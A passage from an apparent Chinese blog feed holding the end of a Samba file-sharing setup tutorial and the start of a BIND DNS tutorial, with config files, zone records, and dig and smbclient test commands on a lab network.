添加指定系统用户</span><br></pre></td></tr></table></figure></p><p>0x09 在<code>192.168.3.57</code>测试刚刚设置的权限是都已否生效,正常来讲,我们应该是一个用户对应一个目录,这样权限相对好控制,可自行写脚本实现</p><p>因为<code>webadmin</code>和<code>dbadmin</code>都属<code>admins</code>组,而<code>admins</code>组对共享目录可写,另外,在共享目录的<code>可写用户列表</code>中也有这俩用户,所以它俩才能往共享目录中写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.3.55/tools -U webadmin</span><br></pre></td></tr></table></figure></p><p><img src="/img/webadmin access succeed.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.3.55/tools -U dbadmin</span><br></pre></td></tr></table></figure></p><p><img src="/img/dbadmin access succeed.png" alt=""></p><p><code>sec</code>既不属于<code>admins</code>组,也不在<code>可写用户列表</code>中,所以,该用户在共享目录中只能看不能写,如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.3.55/tools -U sec</span><br></pre></td></tr></table></figure></p><p><img src="/img/sec access deined.png" alt=""><br><img src="/img/access res.png" alt=""></p><p>0x10 如果嫌手工配置麻烦的话,还有一款纯图形化samba配置工具,实际中最好用完立马就关掉,个人觉得根本犯不着这样,其实写个一键脚本就好了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># yum install samba-swat -y</span><br><span class="line"># vi /etc/xinetd.d/swat</span><br><span class="line"></span><br><span class="line">service swat</span><br><span class="line">&#123;</span><br><span class="line">    port= 901</span><br><span class="line">    socket_type= stream</span><br><span class="line">    wait = no</span><br><span class="line">    only_from = 192.168.3.0/24  # 允许连的ip</span><br><span class="line">    user= root  # 因为工具中间还涉及到一些服务管理功能,所以此处最好直接用root身份来搞</span><br><span class="line">    server= /usr/sbin/swat</span><br><span class="line">    log_on_failure+= USERID</span><br><span class="line">    disable= no</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 另外,需要注意swat基于xinet管理</span><br><span class="line"># /etc/init.d/xinetd start</span><br><span class="line"># chkconfig xinetd on</span><br></pre></td></tr></table></figure></p><p><img src="/img/samba swat.png" alt=""><br><img src="/img/samba swat res.png" alt=""></p><p>0x11 关于samba的一些安全问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">绝大部分问题都出自samba自身的一些漏洞,如,各类RCE...直接可远程getshell的漏洞就已经出了好几次了,所以建议大家实际中尽量用新一点的版本</span><br><span class="line">关于权限分配,问题不太大,毕竟只是个内网服务,别傻到直接把端口暴露在公网就行,不然,很可能哪天一不小心就成了别人的`矿鸡`了</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p><br><br>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;服务比较简单,此处仅做学习实验之用,切勿直接照搬用于实际生产环境中…</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0x01 关于smaba&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;主要用于实现不同系统平台间的文件共享,配置非常简单,轻量,适合用于常规办公内网环境中&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;linux &amp;lt;==&amp;gt; windows &amp;lt;==&amp;gt; unix&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;此次演示环境&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;CentOS6.9 x86_64	ip:192.168.3.55 samba服务器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;CentOS6.9 x86_64	ip:192.168.3.57 用来模拟smb客户端进行访问测试&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x02 samba服务默认所监听的端口&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;137/udp,138/udp nmb 进程提供netbios解析,以满足基于 CIFS 协议的共享访问环境&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;138/tcp,445/tcp smb 进程主要为客户端提供文件共享,打印机服务以及用户权限验证&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x03 使用samba客户端工具 &lt;code&gt;smbclient&lt;/code&gt;,其实有些类似于ftp的客户端工具,也是一种交互式的访问&lt;/p&gt;
&lt;p&gt;&lt;code&gt;在linux下使用smbclient访问windows中的共享目录&lt;/code&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# smbclient -L 192.168.3.23 -U administrator&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# smbclient //192.168.3.23/linux_dir -U dcadmin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# mount -t cifs //192.168.3.23/linux_dir /mnt/windows/ -o username=dcadmin 注意,此处要使用cifs协议进行挂载&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Samba" scheme="https://evil-404.github.io/categories/Samba/"/>
    
    
      <category term="Samba" scheme="https://evil-404.github.io/tags/Samba/"/>
    
  </entry>
  
  <entry>
    <title>DNS 深度理解 [ 一 ]</title>
    <link href="https://evil-404.github.io/2017-12-12-Dns-tips.html"/>
    <id>https://evil-404.github.io/2017-12-12-Dns-tips.html</id>
    <published>2017-12-11T20:09:17.000Z</published>
    <updated>2018-07-01T13:26:20.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>0x01 首先,我们先来简单回顾下<code>DNS的基本解析流程</code>, 比较简单,如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-&gt; 以客户端浏览器访问 www.rootkit.org 域名为例,首先,它会去检查当前浏览器缓存,如果有,就直接响应,如果没有,就继续往下找</span><br><span class="line">-&gt; 接着,操作系统会去检查自己的host文件,如果从中没找到对应关系,会再到系统dns缓存中查,如果缓存中有,就直接返回该域名所对应的ip</span><br><span class="line">-&gt; 如果缓存中没有,则会向我们事先设置好的dns服务器 [ 一般有两个, 主 &amp; 备 ] 去请求,即所谓的`递归查询`,dns服务器首先会到自身解析数据库中去查</span><br><span class="line">-&gt; 如果dns服务器在自己的解析库中也没找到,它就会自动帮我们向根发送询问请求</span><br><span class="line">-&gt; 此时,根看到要请求的是org的后缀,就会把org所在的ns服务器告诉我们的dns</span><br><span class="line">-&gt; 然后,我们的dns服务器就会去请求org所在的ns服务器</span><br><span class="line">-&gt; 当请求到达org ns服务器时,org一看域名是在rootkit这个域下的,就会把rootkit所在的ns服务器再告诉我们的dns服务器</span><br><span class="line">-&gt; 再然后,我们的dns服务器就会去请求rootkit这个域的ns服务器</span><br><span class="line">-&gt; rootkit这个域的ns服务器一看是要访问www就直接找到了www对应的A记录的ip,并把它丢给我们的dns,上面逐个询问的过程,即 `迭代查询`</span><br><span class="line">-&gt; 最后,我们的dns再把最终解析到的这个ip丢给我们的客户端,然后客户端就直接拿着去访问了,如下,访问google.com时的简易流程图</span><br></pre></td></tr></table></figure></p><a id="more"></a><p><img src="/img/dns101.jpg" alt=""><br>演示环境,此处暂以一主一从为例进行演示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DnsMasterip : 192.168.3.60主 DNS 服务器</span><br><span class="line">DnsSlaveip : 192.168.3.61从 DNS 服务器</span><br></pre></td></tr></table></figure></p><p>0x02 几种常见的 DNS 功用类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主dns,主要负责实际的正反向域名解析</span><br><span class="line">从dns,主要从其它的主dns或者从dns中同步解析数据库,`即区域传送`,一般是通过序列号递增来判断主dns是否有更新</span><br><span class="line">缓存DNS服务器...</span><br><span class="line">转发器...</span><br></pre></td></tr></table></figure></p><p>0x03 理解DNS区域解析流向<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">正向 : FQDN -&gt; IP</span><br><span class="line">反向 : IP -&gt; FQDN</span><br><span class="line"></span><br><span class="line">FQDN 即 `完整合法域名`,如 `www.rootkit.org.` 最后面的`.`表示根,意思就是根下的org下的rootkit</span><br><span class="line">不管是正向还是反向区域都需要有一个单独的解析数据库去解析</span><br></pre></td></tr></table></figure></p><p>0x04 认识DNS中一些常见的资源记录类型,说到底就是用它们来标记某个主机类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A  记录FQDN -&gt; ipv4</span><br><span class="line">AAAA 记录FQDN -&gt; ipv6</span><br><span class="line">NS 记录标明当前区域的NS服务器是谁</span><br><span class="line">MX 记录标明当前域内谁是邮件服务器</span><br><span class="line">PTR 记录ip -&gt; FQDN</span><br><span class="line">SOA 记录一个解析库有且只有一个SOA记录,且必须为解析库的第一条记录</span><br><span class="line">CNAME记录别名</span><br></pre></td></tr></table></figure></p><p>0x05 如何在区域配置文件中定义上述各种资源记录</p><p>记录定义标准格式,如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name TTL值[缓存时长可省] IN 记录类型 值</span><br></pre></td></tr></table></figure></p><p>定义SOA记录,一般会配合DNS主从同步来用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">admin.org.  IN SOA    ns.admin.org.    admin.admin.org. (</span><br><span class="line">2017122309    ; 序列号</span><br><span class="line">2H    ; 刷新时间</span><br><span class="line">10M   ; 重试时长</span><br><span class="line">1W   ; 过期时间</span><br><span class="line">1D   ; 否定答案的TTL值</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>定义NS记录,如果连续两条紧挨着的记录相同,后面一个的name可省略,另外NS记录需要在后续有一个对应的A记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin.org.IN NSns1.admin.org.</span><br><span class="line">admin.org.IN NSns2.admin.org.</span><br></pre></td></tr></table></figure></p><p>定义MX记录,注意,此记录有优先级,数字越小,优先级越高,同样,后面也需要指向一条A记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin.org.IN MX10mx1.admin.org.</span><br><span class="line">admin.org.IN MX6mx2.admin.org.</span><br></pre></td></tr></table></figure></p><p>定义A记录,注意,对于A记录,同一个name可以对应多个不同的ip,访问时会自动实现轮询的效果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www.admin.org.  INAl.2.3.4</span><br><span class="line">www.admin.org.  INAl.2.3.4</span><br><span class="line">*.admin.org.  INA1.2.3.4泛解析,用户输入不存在的域名是全部都解析到这个ip上</span><br><span class="line">admin.org.  INA1.2.3.4另外一种泛解析写法 admin.org</span><br></pre></td></tr></table></figure></p><p>定义PTR记录,即反向区域解析,一定要注意,所有的ip地址必须反过来写,另外,都必须带上固有后缀<code>in-addr.arpa.</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.3.2.in-addr.arpa.INPTRwww.admin.org.</span><br></pre></td></tr></table></figure></p><p>定义CNAME记录,意思就是当访问web.admin.org.时就直接解析到<a href="http://www.admin.org" target="_blank" rel="noopener">www.admin.org</a>.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web.admin.org.  INCNAMEwww.admin.org.</span><br></pre></td></tr></table></figure></p><p>0x06 关于一些常见 dns 解析测试工具的基本使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># dig -t 记录类型 要解析的域名 @用于解析该域名的dns服务器</span><br><span class="line"># dig -t axfr 要解析的域名 @用于解析该域名的dns服务器  全量区域同步,可用来测试`区域传送漏洞`</span><br><span class="line"># dig +trace 要解析的域名  跟踪指定域名的详细解析过程</span><br><span class="line"># nslookup交互式查询</span><br><span class="line"># host -t 类型 要解析的域名 用于解析的dns服务器</span><br></pre></td></tr></table></figure></p><p>0x07 因为后续还要做DNS主从实时同步,所以这里就先从<code>配置正向区域解析</code>开始</p><p>开始安装主DNS,bind是核心包,bind-devel是bind核心库,utils是dns测试工具包,工具包里包含了一些常用工具,如,nslookup,dig,host,另外,此处暂以yum方式进行安装,当然,你也可以自行采用源码编译的方式进行安装,不过编译安装不太好的地方就是,有很多关键目录和配置文件没法自动生成,配置起来比较繁琐<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># yum install  bind-utils bind bind-devel bind-chroot -y</span><br><span class="line"># rpm -qa | grep bind</span><br></pre></td></tr></table></figure></p><p>配置主DNS的主配置文件<code>named.conf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"># cat /var/named/named.ca全球13组根DNS服务器解析地址的存放位置</span><br><span class="line"># cp /etc/named.conf&#123;,.bak&#125;先备份配置文件再编辑</span><br><span class="line"># &gt; /etc/named.confbind的主配置文件,主要提供全局配置</span><br><span class="line"># vi /etc/named.conf</span><br><span class="line"></span><br><span class="line">// 全局配置段,注意,dns工作在tcp/53和udp/53端口上,tcp/53一般主要用来进行区域同步,而udp/53主要用来负责正常的解析请求和响应</span><br><span class="line">options &#123;</span><br><span class="line">version &quot;1.1.1&quot;;</span><br><span class="line">listen-on port 53 &#123; 192.168.3.60;127.0.0.1; &#125;;// 把dns端口监听在本地指定的ip上</span><br><span class="line">directory &quot;/var/named/chroot/etc/&quot;;</span><br><span class="line">pid-file &quot;/var/named/chroot/var/run/named/named.pid&quot;;</span><br><span class="line">allow-query &#123; any; &#125;;// 允许任意主机向我进行dns请求</span><br><span class="line">Dump-file &quot;/var/named/chroot/var/log/binddump.db&quot;;</span><br><span class="line">Statistics-file &quot;/var/named/chroot/var/log/named_stats&quot;;</span><br><span class="line">zone-statistics yes;</span><br><span class="line">memstatistics-file &quot;log/mem_stats&quot;;</span><br><span class="line">empty-zones-enable no;</span><br><span class="line">forwarders &#123; 114.114.114.114;8.8.8.8; &#125;;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 设置rndc通信共享秘钥</span><br><span class="line">key &quot;rndc-key&quot; &#123; </span><br><span class="line">algorithm hmac-md5;</span><br><span class="line">secret &quot;Eqw4hClGExUWeDkKBX/pBg==&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">controls &#123;</span><br><span class="line">inet 127.0.0.1 port 953</span><br><span class="line">allow &#123; 127.0.0.1; &#125; keys &#123; &quot;rndc-key&quot;; &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// bind日志配置区段</span><br><span class="line">logging &#123;</span><br><span class="line">channel warning &#123;</span><br><span class="line">file &quot;/var/named/chroot/var/log/dns_warning&quot; versions 10 size 10m;</span><br><span class="line">severity warning;</span><br><span class="line">print-category yes;</span><br><span class="line">print-severity yes;</span><br><span class="line">print-time yes;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">channel general_dns &#123;</span><br><span class="line">file &quot;/var/named/chroot/var/log/dns_log&quot; versions 10 size 100m;</span><br><span class="line">severity info;</span><br><span class="line">print-category yes;</span><br><span class="line">print-severity yes;</span><br><span class="line">print-time yes;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">category default &#123;</span><br><span class="line">warning;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">category queries &#123;</span><br><span class="line">general_dns;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 为了简化bind主配置文件,可以通过include的方式来引入区域文件</span><br><span class="line">include &quot;/var/named/chroot/etc/view.conf&quot;;</span><br></pre></td></tr></table></figure></p><p>针对rndc 的简单配置,关于rndc其实就是个bind服务管理工具,可以通过它在本地或者直接远程来方便的对bind服务进行各种管理操作,如,重载,刷新缓存,关闭…默认工作在tcp/953端口上,比较危险,所以我们一般只让它监听在本地即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/rndc.key</span><br><span class="line"></span><br><span class="line">key &quot;rndc-key&quot; &#123;</span><br><span class="line">    algorithm hmac-md5;</span><br><span class="line">    secret &quot;Eqw4hClGExUWeDkKBX/pBg==&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># vi /etc/rndc.conf</span><br><span class="line"></span><br><span class="line">key &quot;rndc-key&quot; &#123;</span><br><span class="line">algorithm hmac-md5;</span><br><span class="line">secret &quot;Eqw4hClGExUWeDkKBX/pBg==&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">options &#123;</span><br><span class="line">default-key &quot;rndc-key&quot;;</span><br><span class="line">default-server 127.0.0.1;// 让它只监听在本地,禁止rndc远程连接,防止被利用</span><br><span class="line">default-port 953;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>0x08 定义正向区域文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># vi /var/named/chroot/etc/view.conf</span><br><span class="line"></span><br><span class="line">view &quot;MasterView&quot; &#123;</span><br><span class="line">zone &quot;admin.org&quot; &#123;</span><br><span class="line">type    master;</span><br><span class="line">file    &quot;admin.org.zone&quot;;  // 区域文件名,此处的文件名可以随意</span><br><span class="line">allow-transfer &#123;   // 允许传送的主机,所谓的区域传送漏洞也就出在这里</span><br><span class="line">192.168.3.61;</span><br><span class="line">// any;   // 如果此处设置为any,则允许任意主机来传送,这就是产生区域传送漏洞的根源</span><br><span class="line">   // 所以务必谨记,跟谁传送,就只写谁的ip</span><br><span class="line">&#125;;</span><br><span class="line">notify  yes;</span><br><span class="line">also-notify &#123;</span><br><span class="line">192.168.3.61;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>0x09 定义正向区域文件,我们再来编写正向区域解析数据库,内部主要用于存放各种记录类型和宏,如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># vi /var/named/chroot/etc/admin.org.zone</span><br><span class="line"></span><br><span class="line">$TTL 3600   ; 1h</span><br><span class="line">@     IN SOA  ns1.admin.org. email.admin.org (</span><br><span class="line">                        2003       ; serial   // 时刻谨记,每次如果是手工修改完解析库文件以后都要自增一下</span><br><span class="line">                        900        ; refresh (15 minutes)</span><br><span class="line">                        600        ; retry (10 minutes)</span><br><span class="line">                        86400      ; expire (1 day)</span><br><span class="line">                        3600       ; minimum (1 hour)</span><br><span class="line">                         )</span><br><span class="line">                IN      NS      ns1.admin.org.</span><br><span class="line">                IN      NS      ns2.admin.org.</span><br><span class="line">                IN      MX  10  mx1.admin.org.</span><br><span class="line">                IN      MX  20  mx2.admin.org.</span><br><span class="line">ns1INA192.168.3.3</span><br><span class="line">ns2INA192.168.3.61</span><br><span class="line">mx1INA192.168.3.4</span><br><span class="line">mx2INA192.168.3.5</span><br><span class="line">wwwINA192.168.3.6</span><br><span class="line">wwwINA192.168.3.3</span><br><span class="line">ftpINCNAMEwww.admin.org.</span><br><span class="line">*INA192.168.3.110//此处,即为泛解析的两种书写方式</span><br><span class="line">admin.org.INA192.168.3.120</span><br><span class="line">cactiINA192.168.3.16</span><br><span class="line">zabbixINA192.168.3.18</span><br></pre></td></tr></table></figure></p><p>0x10 配置完正向区域解析库以后,我们就可以来重载服务,测试解析了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># named-checkconf 此命令会自动检查bind主配置文件是否有语法错误</span><br><span class="line"># named-checkzone &quot;admin.org&quot; admin.org.zone检查指定区域解析库文件是否有错误配置</span><br><span class="line"># ps -aux | grep named我们看到bind默认是用named用户来运行的,我们改下区域解析库文件的权限</span><br><span class="line"># chmod 640 /var/named/chroot/etc/admin.org.zone</span><br><span class="line"># ll /var/named/chroot/etc/admin.org.zone</span><br><span class="line"># chown named.named /var/named/chroot/etc/admin.org.zone</span><br><span class="line"># /etc/init.d/named start启动dns服务</span><br><span class="line"># /etc/init.d/named reload重载dns服务</span><br><span class="line"># rndc reload在dns服务启动的情况下,也可使用rndc来重载区域解析库</span><br><span class="line"># chkconfig named on加入系统自启动</span><br><span class="line"># netstat -tulnp看下端口有没正常起来</span><br><span class="line"># dig -t A www.admin.org @192.168.3.60</span><br><span class="line"># dig -t A mx2.admin.org @192.168.3.60</span><br></pre></td></tr></table></figure></p><p><img src="/img/dns bind resolv.png" alt=""></p><p>0x11 在正向区域测试解析没有任何问题之后,我们再来看如何定义反向区域,注意,反向区域的ip地址要全部反写,即 <code>变化的区域不写,不变的区域反写</code>,此区域不需要MX和A记录,只需要PTR记录即可,另外,通常都是<code>先有正向解析再有反向解析</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.3.x =&gt; 3.168.192.in-addr.arpa</span><br><span class="line">192.168.x.x =&gt; 168.192.in-addr.arpa</span><br></pre></td></tr></table></figure></p><p>定义反向区域的方式很简单,先定义好反向区域文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># vi /var/named/chroot/etc/view.conf</span><br><span class="line"></span><br><span class="line">view &quot;MasterView&quot; &#123;</span><br><span class="line">    zone &quot;admin.org&quot; IN &#123;</span><br><span class="line">type    master;</span><br><span class="line">file    &quot;admin.org.zone&quot;;</span><br><span class="line">allow-transfer &#123;</span><br><span class="line">192.168.3.61;</span><br><span class="line">&#125;;</span><br><span class="line">notify  yes;</span><br><span class="line">also-notify &#123;</span><br><span class="line">192.168.3.61;</span><br><span class="line">&#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    zone &quot;3.168.192.in-addr.arpa&quot; IN &#123; // 一样要反写,此处就表示192.168.3.x这个网段</span><br><span class="line">typemaster;</span><br><span class="line">file&quot;192.168.3.zone&quot;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>再来定义反向区域解析库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 